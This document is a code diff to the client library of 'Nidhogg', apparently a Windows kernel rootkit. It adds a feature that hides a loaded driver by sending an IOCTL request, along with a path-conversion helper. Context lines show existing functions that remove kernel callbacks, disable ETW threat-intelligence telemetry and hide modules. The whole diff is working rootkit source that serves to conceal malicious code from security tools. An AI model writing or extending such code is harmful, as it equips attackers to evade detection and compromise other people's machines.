@@ -42,6 +42,8 @@
 #define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
@@ -234,6 +236,11 @@ struct HiddenModuleInformation {
 	ULONG Pid;
 	WCHAR* ModuleName;
 };
+
+struct HiddenDriverInformation {
+	WCHAR* DriverName;
+	bool Hide;
+};
 // *********************************************************************************************************
 
 std::wstring GetHKCUPath() {
@@ -325,6 +332,18 @@ std::wstring ParseRegistryKey(wchar_t* key) {
 	}
 	else {
 		return L"";
+	}
+	return result;
+}
+
+std::wstring ParsePath(wchar_t* path) {
+	std::wstring result = path;
+
+	if (result.find(LR"(C:\Windows)") != std::wstring::npos) {
+		result.replace(0, 10, LR"(\SystemRoot)");
+	}
+	else if (result.find(LR"(C:\)") != std::wstring::npos) {
+		result.replace(0, 3, LR"(\??\C:\)");
 	}
 	return result;
 }
@@ -937,6 +956,28 @@ namespace Nidhogg {
 	}
 
 	namespace MemoryUtils {
+		int NidhoggHideDriver(HANDLE hNidhogg, wchar_t* driverPath) {
+			DWORD returned = 0;
+			HiddenDriverInformation driverInfo{};
+
+			if (!driverPath)
+				return NIDHOGG_GENERAL_ERROR;
+
+			if (wcslen(driverPath) > MAX_PATH)
+				return NIDHOGG_GENERAL_ERROR;
+
+			std::wstring parsedDriverName = ParsePath(driverPath);
+			driverInfo.DriverName = parsedDriverName.data();
+			driverInfo.Hide = true;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_HIDE_UNHIDE_DRIVER,
+				&driverInfo, sizeof(driverInfo),
+				nullptr, 0, &returned, nullptr))
+				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+
+			return NIDHOGG_SUCCESS;
+		}
+
 		int NidhoggHideModule(HANDLE hNidhogg, DWORD pid, wchar_t* modulePath) {
 			DWORD returned = 0;
 			HiddenModuleInformation moduleInfo{};
